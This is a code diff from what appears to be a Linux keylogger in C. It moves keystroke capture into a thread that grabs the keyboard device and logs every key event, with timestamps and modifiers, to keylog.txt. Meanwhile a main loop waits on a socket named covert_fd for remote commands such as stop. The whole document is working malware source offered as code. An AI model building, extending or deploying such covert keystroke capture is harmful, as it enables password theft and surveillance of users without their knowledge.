@@ -9,12 +9,14 @@
 #include <string.h>
 #include <sys/select.h>
 #include <sys/time.h>
+#include <pthread.h>
 
 static modifier_state_t modifiers = {0, 0, 0, 0, 0};
 static struct timeval start_time = {0, 0};
 static int start_time_valid = 0;
 static FILE *log_file = NULL;
 
+// --- Modifier helpers ---
 static void update_modifiers(int code, int value) {
     int pressed = (value == 1);
     switch(code) {
@@ -51,10 +53,7 @@ static void print_relative_time(struct timeval *ev_time) {
     } else {
         long sec_delta = ev_time->tv_sec - start_time.tv_sec;
         long usec_delta = ev_time->tv_usec - start_time.tv_usec;
-        if (usec_delta < 0) {
-            sec_delta--;
-            usec_delta += 1000000;
-        }
+        if (usec_delta < 0) { sec_delta--; usec_delta += 1000000; }
         snprintf(time_buf, sizeof(time_buf), "+%ld.%06ld", sec_delta, usec_delta);
     }
     fprintf(log_file, "%-15s", time_buf);
@@ -147,37 +146,77 @@ static const char* value_to_string(int type, int code, int value) {
     return buf;
 }
 
-void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) {
+typedef struct {
+    int keyboard_fd;
+} kb_thread_arg_t;
+
+static void* keyboard_thread(void *arg) {
+    kb_thread_arg_t *kba = (kb_thread_arg_t*)arg;
+    int fd = kba->keyboard_fd;
     struct input_event ev;
     ssize_t n;
+    char code_buf[32];
+
+    fcntl(fd, F_SETFL, O_NONBLOCK);
+    ioctl(fd, EVIOCGRAB, 1); // grab the keyboard
+
+    while (1) {
+        n = read(fd, &ev, sizeof(ev));
+        if (n == sizeof(ev) && ev.type == EV_KEY) {
+            printf("\nkey event detected\n");
+            print_relative_time(&ev.time);
+            fprintf(log_file, " %-10s %-20s %-15s",
+                    event_type_to_string(ev.type),
+                    code_to_string_buf(ev.type, ev.code, code_buf, sizeof(code_buf)),
+                    value_to_string(ev.type, ev.code, ev.value));
+            fprintf(log_file, " %d(%s)", ev.code, code_to_string_buf(ev.type, ev.code, code_buf, sizeof(code_buf)));
+            print_modifiers();
+            fprintf(log_file, "\n");
+            fflush(log_file);
+
+            update_modifiers(ev.code, ev.value);
+        } else if (n < 0 && (errno == EAGAIN || errno == EINTR)) {
+            // No data, yield briefly
+            usleep(1000);
+            continue;
+        } else if (n < 0) {
+            perror("keyboard read");
+            break;
+        }
+    }
+
+    return NULL;
+}
+
+// --- Start key logging ---
+void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) {
     fd_set readfds;
     struct timeval tv;
     int maxfd;
     int running = 1;
-
     int sock_fd = ctx->covert_fd;
 
     log_file = fopen("keylog.txt", "w");
     if (!log_file) return;
-
     fprintf(log_file, "RelTime         Type       Code                 Value          Modifiers\n");
     fflush(log_file);
 
     modifiers = (modifier_state_t){0,0,0,0,0};
     start_time_valid = 0;
 
-    fcntl(keyboard_fd, F_SETFL, O_NONBLOCK);
+    // --- spawn keyboard thread ---
+    pthread_t kb_thread_id;
+    kb_thread_arg_t arg = { .keyboard_fd = keyboard_fd };
+    pthread_create(&kb_thread_id, NULL, keyboard_thread, &arg);
 
-    maxfd = keyboard_fd;
-    if (sock_fd >= 0 && sock_fd > maxfd) maxfd = sock_fd;
-
+    // --- main loop for socket events ---
+    maxfd = sock_fd;
     while (running) {
         FD_ZERO(&readfds);
-        FD_SET(keyboard_fd, &readfds);
         if (sock_fd >= 0) FD_SET(sock_fd, &readfds);
 
         tv.tv_sec = 0;
-        tv.tv_usec = 100000;
+        tv.tv_usec = 100000; // 100 ms
 
         int ret = select(maxfd + 1, &readfds, NULL, NULL, &tv);
         if (ret < 0) {
@@ -186,33 +225,16 @@ void start_key_logging(int keyboard_fd, struct Context *ctx, struct List *list) 
             break;
         }
 
-        if (FD_ISSET(keyboard_fd, &readfds)) {
-            while ((n = read(keyboard_fd, &ev, sizeof(ev))) > 0) {
-                if (n != sizeof(ev)) continue;
-                if (ev.type != EV_KEY) continue;
-
-                printf("\nkey event detected\n");
-                char code_buf[32];
-                print_relative_time(&ev.time);
-                fprintf(log_file, " %-10s %-20s %-15s",
-                        event_type_to_string(ev.type),
-                        code_to_string_buf(ev.type, ev.code, code_buf, sizeof(code_buf)),
-                        value_to_string(ev.type, ev.code, ev.value));
-                print_modifiers();
-                fprintf(log_file, "\n");
-                fflush(log_file);
-
-                update_modifiers(ev.code, ev.value);
-            }
-            if (n < 0 && errno != EAGAIN) perror("keyboard read");
-        }
-
         if (sock_fd >= 0 && FD_ISSET(sock_fd, &readfds)) {
             runner_recv(ctx, list);
             if (list->type == CMD_STOP) running = 0;
             free_list(list);
         }
     }
+
+    // --- stop keyboard thread ---
+    pthread_cancel(kb_thread_id);
+    pthread_join(kb_thread_id, NULL);
 
     fclose(log_file);
     log_file = NULL;
